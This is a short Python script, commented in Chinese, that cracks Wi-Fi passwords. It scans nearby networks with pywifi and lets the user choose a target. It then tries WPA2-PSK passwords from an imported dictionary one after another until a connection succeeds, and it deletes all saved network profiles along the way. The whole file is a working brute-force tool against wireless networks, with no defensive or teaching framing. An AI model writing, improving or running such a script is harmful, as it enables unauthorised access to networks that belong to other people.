import pywifi
from pywifi import const
import time
import pwd_dic
import os

def disable_wifi():
    os.system("netsh interface set interface Wi-Fi admin=disable")  # 禁用物理机的无线网卡

def enable_wifi():
    os.system("netsh interface set interface Wi-Fi admin=enable")  # 启用物理机的无线网卡

pwd_list = pwd_dic.low_pwd()
def scan_wifi(iface):
    """扫描周围的WiFi网络"""
    iface.scan()  # 开始扫描
    time.sleep(5)  # 等待扫描完成
    scan_results = iface.scan_results()  # 获取扫描结果
    return scan_results
def connect_wifi(iface, ssid, password,num):
    """连接到指定的WiFi网络"""
    # 创建WiFi配置文件
    profile = pywifi.Profile()
    profile.ssid = ssid  # 设置SSID
    profile.auth = const.AUTH_ALG_OPEN  # 设置认证算法
    profile.akm.append(const.AKM_TYPE_WPA2PSK)  # 设置加密算法（WPA2-PSK）
    profile.cipher = const.CIPHER_TYPE_CCMP  # 设置加密类型
    profile.key = password  # 设置WiFi密码

    # 添加配置文件并连接
    iface.remove_all_network_profiles()  # 清除现有配置
    tmp_profile = iface.add_network_profile(profile)  # 添加新配置
    iface.connect(tmp_profile)  # 连接WiFi

    # 等待连接完成
    time.sleep(3)
    if iface.status() == const.IFACE_CONNECTED:
        print(f"成功连接到 {ssid} pwd:{password}")
        return True
    else:
        print(f"连接失败：{ssid} pwd:{password} residual:{2000-num}")
        return False



def main():
    # 初始化WiFi接口
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]  # 获取第一个无线网卡接口

    # 扫描周围的WiFi网络
    print("正在扫描周围的WiFi网络...")
    scan_results = scan_wifi(iface)

    # 打印扫描结果
    wifi_list = {}
    i=0
    for result in scan_results:
        wifi_list[i]={}
        wifi_list[i]["SSID"] = result.ssid;wifi_list[i]["BSSID"]=result.bssid;wifi_list[i]["信号强度"]=result.signal
        print(f"wifi_id: {i},SSID: {result.ssid}, BSSID: {result.bssid}, 信号强度: {result.signal}")
        i+=1

    # 输入目标WiFi的SSID
    target_ssid = int(input("选择wifi_id: "))
    target_ssid = wifi_list[target_ssid]["SSID"]
    target_password = input("请输入目标WiFi的密码: ")

    # 尝试连接到目标WiFi
    disable_wifi()
    enable_wifi()
    print(f"正在尝试连接到 {target_ssid}...")
    num = 0
    if target_password:
        connect_wifi(iface,target_ssid,target_password,num)
    else:
        for i in pwd_list:
            if connect_wifi(iface, target_ssid, i,num):
                break
            num+=1


if __name__ == '__main__':
    main()

